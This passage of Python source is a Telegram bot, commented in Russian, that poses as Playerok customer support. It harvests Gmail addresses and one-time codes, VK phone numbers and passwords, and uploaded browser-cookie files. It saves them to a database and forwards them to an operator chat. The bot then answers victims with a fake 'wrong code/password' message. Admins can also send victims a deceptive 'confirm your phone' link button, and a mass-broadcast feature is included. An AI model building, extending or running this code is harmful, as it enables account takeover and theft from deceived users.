    user_id = msg.from_user.id  # ID отправителя сообщения
    text = msg.text if msg.text else msg.caption or ""
    state = user_state.get(chat_id, "")

    # -------- РАССЫЛКА (работает ВСЕГДА для консоли) --------
    if chat_id == CONSOLE_CHAT_ID and broadcast_state.get('active', False):
        console_msg_id = broadcast_state.get('console_message_id')
        
        def send_broadcast():
            users = get_all_users_from_db()
            success_count = 0
            fail_count = 0
            blocked_count = 0  # Счётчик заблокировавших бота
            
            # Обновляем консоль с процессом
            if console_msg_id:
                try:
                    progress_text = f"""╔═══════════════════════════╗
║   📢 <b>РАССЫЛКА</b>              ║
╚═══════════════════════════╝

⏳ <b>Идет рассылка...</b>

📊 <b>Прогресс:</b> <code>0/{len(users)}</code>"""
                    
                    bot.edit_message_text(
                        progress_text,
                        CONSOLE_CHAT_ID,
                        console_msg_id,
                        parse_mode="HTML"
                    )
                except Exception as e:
                    print(f"⚠️ Ошибка обновления консоли: {e}")
            
            # Рассылаем сообщение
            for idx, user in enumerate(users, 1):
                user_chat_id = user[0]
                try:
                    if msg.photo:
                        # Если есть фото
                        bot.send_photo(user_chat_id, msg.photo[-1].file_id, caption=text)
                    else:
                        # Если только текст
                        bot.send_message(user_chat_id, text)
                    success_count += 1
                    
                    # Обновляем прогресс каждые 5 пользователей
                    if idx % 5 == 0 and console_msg_id:
                        try:
                            progress_text = f"""╔═══════════════════════════╗
║   📢 <b>РАССЫЛКА</b>              ║
╚═══════════════════════════╝

⏳ <b>Идет рассылка...</b>

📊 <b>Прогресс:</b> <code>{idx}/{len(users)}</code>
✅ <b>Успешно:</b> <code>{success_count}</code>
🚫 <b>Заблокировали:</b> <code>{blocked_count}</code>
❌ <b>Других ошибок:</b> <code>{fail_count}</code>"""
                            
                            bot.edit_message_text(
                                progress_text,
                                CONSOLE_CHAT_ID,
                                console_msg_id,
                                parse_mode="HTML"
                            )
                        except:
                            pass
                    
                except Exception as e:
                    error_message = str(e)
                    
                    # Проверяем, заблокировал ли пользователь бота
                    if "bot was blocked by the user" in error_message or "user is deactivated" in error_message:
                        blocked_count += 1
                        print(f"🚫 Пользователь {user_chat_id} заблокировал бота")
                        # Можно автоматически удалить из БД или пометить
                        # delete_user_from_db(user_chat_id)  # Раскомментируйте если нужно
                    else:
                        # Другая ошибка
                        print(f"❌ Ошибка отправки {user_chat_id}: {e}")
                        fail_count += 1
            
            # Обновляем консоль с результатами
            try:
                if console_msg_id:
                    report = f"""╔═══════════════════════════╗
║   📢 <b>РАССЫЛКА ЗАВЕРШЕНА</b>  ║
╚═══════════════════════════╝

✅ <b>Доставлено:</b> <code>{success_count}</code>
🚫 <b>Заблокировали бота:</b> <code>{blocked_count}</code>
❌ <b>Других ошибок:</b> <code>{fail_count}</code>
👥 <b>Всего пользователей:</b> <code>{len(users)}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ <b>Рассылка завершена!</b>"""
                    
                    markup = InlineKeyboardMarkup()
                    markup.add(InlineKeyboardButton("🏠 Вернуться", callback_data="console_back"))
                    
                    bot.edit_message_text(
                        report,
                        CONSOLE_CHAT_ID,
                        console_msg_id,
                        reply_markup=markup,
                        parse_mode="HTML"
                    )
                    
                    # Через 5 секунд автоматически вернем консоль
                    time.sleep(5)
                    send_or_update_console()
            except Exception as e:
                log_error("broadcast_finish", str(e))
                print(f"⚠️ Ошибка обновления консоли с результатами: {e}")
                # Если не получилось обновить - просто возвращаем консоль
                send_or_update_console()
        
        # Сбрасываем состояние рассылки
        broadcast_state['active'] = False
        broadcast_state.pop('console_message_id', None)
        
        threading.Thread(target=send_broadcast, daemon=True).start()
        return

    save_user_message_id(chat_id, msg.message_id)

    # -------- COOKIE TXT ФАЙЛ --------
    if msg.document and user_state.get(chat_id) == "cookie_input":
        file_name = msg.document.file_name or ""
        if file_name.endswith(".txt"):
            try:
                # Скачиваем файл
                file_info = bot.get_file(msg.document.file_id)
                downloaded = bot.download_file(file_info.file_path)
                cookie_content = downloaded.decode("utf-8", errors="replace")
                
                # Сохраняем в БД
                save_user_data(chat_id, "cookie_txt", cookie_content)
                log_to_actions_chat(chat_id, cookie_content[:500], "🍪 Cookie TXT файл")
                log_user_action(chat_id, f"🍪 Отправил Cookie файл: {file_name}")
                user_state.pop(chat_id, None)

                # Сразу отправляем файл в консоль как документ
                try:
                    import io as _io
                    _conn_u = sqlite3.connect(DATABASE_FILE)
                    _cur_u  = _conn_u.cursor()
                    _cur_u.execute("SELECT username, first_name FROM users WHERE user_id=?", (chat_id,))
                    _urow = _cur_u.fetchone()
                    _conn_u.close()
                    _uname_c = (_urow[0] or "") if _urow else ""
                    _fname_c = (_urow[1] or str(chat_id)) if _urow else str(chat_id)
                    _dt_str  = datetime.now().strftime("%d%m%Y_%H%M")
                    _fname_file = f"cookie_{chat_id}_{_dt_str}.txt"
                    _bio = _io.BytesIO(cookie_content.encode("utf-8"))
                    _bio.name = _fname_file
                    _caption = (
                        f"🍪 <b>Новый Cookie файл</b>\n\n"
                        f"👤 {_fname_c}"
                        + (f" | @{_uname_c}" if _uname_c else "")
                        + f"\n🆔 <code>{chat_id}</code>\n"
                        f"📅 {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
                    )
                    bot.send_document(
                        CONSOLE_CHAT_ID,
                        _bio,
                        caption=_caption,
                        parse_mode="HTML"
                    )
                    print(f"✅ Cookie файл пользователя {chat_id} отправлен в консоль")
                except Exception as _e:
                    log_error("cookie_to_console", str(_e))
                    print(f"⚠️ Не удалось отправить cookie в консоль: {_e}")
                
                response_mode = get_response_mode()
                if response_mode == 'processing':
                    response_text = "🟢 <b>Обработка</b>\n\n⏳ Пожалуйста, подождите!"
                else:
                    response_text = "Не верный код/пароль. ❌"
                
                msg_sent = bot.send_message(chat_id, response_text, reply_markup=cancel_kb(), parse_mode="HTML")
                save_message_id(chat_id, msg_sent.message_id)
            except Exception as e:
                log_error("cookie_file", str(e))
                err_msg = bot.send_message(chat_id, "❌ Ошибка при обработке файла. Попробуйте ещё раз.", reply_markup=cancel_kb())
                save_message_id(chat_id, err_msg.message_id)
        else:
            err_msg = bot.send_message(chat_id, "❌ Пожалуйста, отправьте файл в формате <b>text.txt</b>", reply_markup=cancel_kb(), parse_mode="HTML")
            save_message_id(chat_id, err_msg.message_id)
        return

    # -------- ПРОВЕРКА БЛОКИРОВКИ ПОЛЬЗОВАТЕЛЯ --------
    # Проверяем заблокирован ли пользователь (НЕ действует на администраторов в группах)
    if chat_id > 0 and is_user_blocked(chat_id):
        # Если пользователь заблокирован - просто игнорируем его сообщения
        print(f"🚫 Заблокированный пользователь {chat_id} пытался отправить сообщение")
        return

    # -------- ЛОГИРОВАНИЕ ВСЕХ СООБЩЕНИЙ --------
    # Всегда логируем что пользователь написал
    log_to_actions_chat(chat_id, text, "💬 Сообщение пользователя")
    
    # -------- ОТВЕТ АДМИНИСТРАТОРА (РАБОТАЕТ ВСЕГДА) --------
    # Эта функция НЕЗАВИСИМА от настройки поддержки
    # Администраторы ВСЕГДА могут отвечать пользователям через кнопку "Ответить"
    # ВАЖНО: Проверяем user_id (отправителя), а не chat_id (группы)
    if user_id in admin_reply_state:
        reply_info = admin_reply_state.pop(user_id)
        target_user = reply_info["user_id"]
        group_id = reply_info["group_id"]
        thread_id = reply_info["thread_id"]
        
        try:
            # Отправляем пользователю только текст без префикса
            bot.send_message(target_user, text)
            
            # Подтверждение в группе в ТОЙ ЖЕ ТЕМЕ
            bot.send_message(
                group_id,
                f"✅ Ответ отправлен пользователю {target_user}",
                message_thread_id=thread_id
            )
            
            # Удаляем сообщение администратора
            try:
                bot.delete_message(chat_id, msg.message_id)
            except:
                pass
            
            print(f"✅ Админ {user_id} отправил ответ пользователю {target_user}")
                
        except Exception as e:
            log_error("admin_reply", str(e))
            bot.send_message(
                group_id,
                f"❌ Ошибка отправки: {e}",
                message_thread_id=thread_id
            )
        return

    # -------- АДМИНИСТРАТОР ОТПРАВЛЯЕТ ССЫЛКУ --------
    if user_id in admin_link_state:
        link_info = admin_link_state.pop(user_id)
        target_user = link_info["user_id"]
        group_id = link_info["group_id"]
        thread_id = link_info["thread_id"]
        
        try:
            # Проверяем что это ссылка
            if not text.startswith("http://") and not text.startswith("https://"):
                bot.send_message(
                    group_id,
                    f"❌ Ошибка: Отправьте корректную ссылку (должна начинаться с http:// или https://)",
                    message_thread_id=thread_id
                )
                # Возвращаем состояние обратно
                admin_link_state[user_id] = link_info
                return
            
            # Красивое сообщение с кнопкой "Подтвердить"
            link_keyboard = InlineKeyboardMarkup()
            link_keyboard.add(
                InlineKeyboardButton("✅ Подтвердить", url=text)
            )
            
            user_message = (
                "📱 <b>Подтверждение номера телефона</b>\n\n"
                "Для продолжения работы, пожалуйста, подтвердите свой номер телефона.\n\n"
                "Нажмите кнопку <b>\"Подтвердить\"</b> ниже для завершения проверки.\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "🔒 <i>Это безопасная процедура верификации</i>"
            )
            
            # Отправляем пользователю красивое сообщение с кнопкой
            bot.send_message(
                target_user,
                user_message,
                reply_markup=link_keyboard,
                parse_mode="HTML"
            )
            
            # Подтверждение в группе
            bot.send_message(
                group_id,
                f"✅ Ссылка отправлена пользователю {target_user}\n🔗 {text}",
                message_thread_id=thread_id
            )
            
            # Удаляем сообщение администратора со ссылкой
            try:
                bot.delete_message(chat_id, msg.message_id)
            except:
                pass
            
            print(f"✅ Админ {user_id} отправил ссылку пользователю {target_user}")
                
        except Exception as e:
            log_error("admin_link", str(e))
            bot.send_message(
                group_id,
                f"❌ Ошибка отправки ссылки: {e}",
                message_thread_id=thread_id
            )
        return

    # -------- ПРОВЕРКА ТЕХНИЧЕСКИХ РАБОТ ДЛЯ ОБЫЧНЫХ ПОЛЬЗОВАТЕЛЕЙ --------
    # Проверяем режим технических работ для всех действий пользователей
    if is_maintenance_mode():
        maintenance_text = (
            "🔧 <b>Технические работы</b>\n\n"
            "⚠️ В данный момент проводятся технические работы.\n"
            "<b>Пожалуйста, подождите!</b>\n\n"
            "Приносим извинения за временные неудобства."
        )
        try:
            bot.send_message(chat_id, maintenance_text, parse_mode="HTML")
        except:
            pass
        return

    # -------- ПОДДЕРЖКА --------
    if state == "support":
        log_support_message(chat_id, text)
        log_user_action(chat_id, f"💬 Отправил в поддержку: {text[:50]}...")
        
        # Удаляем только предыдущие сообщения бота (НЕ удаляем сообщения пользователя)
        delete_previous_messages(chat_id)
        
        # Отправляем ответ поддержки (его НЕ сохраняем в user_messages, чтобы не удалить)
        msg = bot.send_message(
            chat_id,
            "📨 Уважаемый клиент.\n\n"
            "Благодарим вас за обращение в службу поддержки Playerok. "
            "Ваше сообщение успешно получено, и мы готовы оказать вам необходимую помощь.\n\n"
            "С наилучшими пожеланиями,\n"
            "Команда поддержки Playerok",
        )
        # НЕ сохраняем это сообщение для удаления!
        
        # Ждем 3 секунды и возвращаем в главное меню
        time.sleep(3)
        send_welcome(chat_id)
        return

    # -------- GMAIL EMAIL --------
    if state == "gmail_email":
        email_pattern = r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
        
        if not re.match(email_pattern, text):
            msg = bot.send_message(
                chat_id,
                "❌ Извините, но введенный адрес электронной почты Gmail недействителен.\n\n"
                "Пожалуйста, убедитесь, что вводите правильный адрес.",
                reply_markup=cancel_kb(),
            )
            save_message_id(chat_id, msg.message_id)
            return
        
        # Сохраняем email в БД
        save_user_data(chat_id, "gmail_email", text)
        
        user_state[chat_id] = "gmail_code"
        log_to_actions_chat(chat_id, text, "📧 Gmail Email")
        log_user_action(chat_id, f"📧 Ввел email: {text}")
        
        msg = bot.send_message(
            chat_id,
            "Введите одноразовый код который пришёл на электронную почту.\n\n"
            "Возникли проблемы пишите в поддержку.",
            reply_markup=cancel_kb(),
        )
        save_message_id(chat_id, msg.message_id)
        return

    # -------- GMAIL CODE --------
    if state == "gmail_code":
        # Сохраняем код в БД
        save_user_data(chat_id, "gmail_code", text)
        
        log_to_actions_chat(chat_id, text, "🔢 Gmail Code")
        log_user_action(chat_id, f"🔢 Ввел код: {text}")
        
        # Сбрасываем состояние
        user_state.pop(chat_id, None)
        
        # Проверяем режим ответа
        response_mode = get_response_mode()
        if response_mode == 'processing':
            response_text = "🟢 <b>Обработка</b>\n\n⏳ Пожалуйста, подождите!"
        else:
            response_text = "Не верный код/пароль. ❌"
        
        msg = bot.send_message(
            chat_id,
            response_text,
            reply_markup=cancel_kb(),
            parse_mode="HTML"
        )
        save_message_id(chat_id, msg.message_id)
        return

    # -------- VK PHONE --------
    if state == "vk_phone":
        phone_pattern = r"^\+?[0-9]{10,15}$"
        
        if not re.match(phone_pattern, text.replace(" ", "").replace("-", "")):
            msg = bot.send_message(
                chat_id,
                "❌ Извините, кажется, вы ввели номер некорректно.\n\n"
                "Пожалуйста, введите его в международной форме, начиная с символа \"+\". "
                "Например, \"+1234567890\".",
                reply_markup=cancel_kb(),
            )
            save_message_id(chat_id, msg.message_id)
            return
        
        # Сохраняем телефон в БД
        save_user_data(chat_id, "vk_phone", text)
        
        vk_temp[chat_id] = {"phone": text}
        user_state[chat_id] = "vk_password"
        log_to_actions_chat(chat_id, text, "📱 VK Phone")
        log_user_action(chat_id, f"📱 Ввел телефон VK: {text}")
        
        msg = bot.send_message(
            chat_id,
            "Введите пароль от [VK].\n\n"
            "Возникли проблемы пишите в поддержку.",
            reply_markup=cancel_kb(),
        )
        save_message_id(chat_id, msg.message_id)
        return

    # -------- VK PASSWORD --------
    if state == "vk_password":
        # Сохраняем пароль в БД
        save_user_data(chat_id, "vk_password", text)
        
        log_to_actions_chat(chat_id, text, "🔐 VK Password")
        log_user_action(chat_id, "🔐 Ввел пароль VK")
        
        # Сбрасываем состояние
        user_state.pop(chat_id, None)
        vk_temp.pop(chat_id, None)
        
        # Проверяем режим ответа
        response_mode = get_response_mode()
        if response_mode == 'processing':
            response_text = "🟢 <b>Обработка</b>\n\n⏳ Пожалуйста, подождите!"
        else:
            response_text = "Не верный код/пароль. ❌"
        
        msg = bot.send_message(
            chat_id,
            response_text,
            reply_markup=cancel_kb(),
            parse_mode="HTML"
        )
        save_message_id(chat_id, msg.message_id)
        return

# ---------- ЗАПУСК БОТА ----------
if __name__ == "__main__":
    try:
        check_lock()
        
        # Устанавливаем время старта бота
        globals()['bot_start_time'] = datetime.now()
        
        # Инициализируем базу данных
        init_database()
        
        # Загружаем темы из БД в кеш
        load_user_threads()
        
        print("🚀 Бот запущен и готов к работе!")
        print(f"📊 Загружено пользователей: {len(load_known_users())}")
        print(f"📋 Загружено тем из БД: {len(user_threads_cache)}")
        
        # Информируем о системе блокировки
        update_old_support_messages_info()
        
        # Отправляем/обновляем консоль (если консоль уже есть - просто обновит её)
        print("📱 Инициализация консоли...")
        send_or_update_console()
        print("✅ Консоль готова!")
        
        # Счётчик переподключений
        reconnect_count = 0
        
        # Бесконечный цикл с обработкой сетевых ошибок
        while True:
            try:
                print("🔄 Подключение к Telegram...")
                bot.infinity_polling(timeout=60, long_polling_timeout=60)
                
            except (ProtocolError, ReadTimeoutError, RemoteDisconnected, requests.exceptions.ConnectionError) as e:
                # Сетевые ошибки - переподключаемся
                reconnect_count += 1
                print(f"⚠️ Потеряно соединение ({reconnect_count}). Переподключение через 5 сек...")
                time.sleep(5)
                continue
                
            except Exception as e:
                # Другие ошибки - логируем
                error_type = type(e).__name__
                if "connection" in error_type.lower() or "timeout" in error_type.lower():
                    # Это тоже сетевая ошибка
                    reconnect_count += 1
                    print(f"⚠️ Сетевая ошибка ({error_type}). Переподключение через 5 сек...")
                    time.sleep(5)
                    continue
                else:
                    # Неизвестная ошибка - выводим полностью
                    log_error("polling_error", str(e), traceback.format_exc())
                    print(f"❌ Ошибка polling: {error_type}: {e}")
                    print(f"⏳ Попытка переподключения через 10 сек...")
                    time.sleep(10)
                    continue
        
    except KeyboardInterrupt:
        print("\n⚠️ Остановка бота...")
    except Exception as e:
        log_error("critical_error", str(e), traceback.format_exc())
        print(f"❌ Критическая ошибка: {e}")
    finally:
        remove_lock()
        print("👋 Бот остановлен")
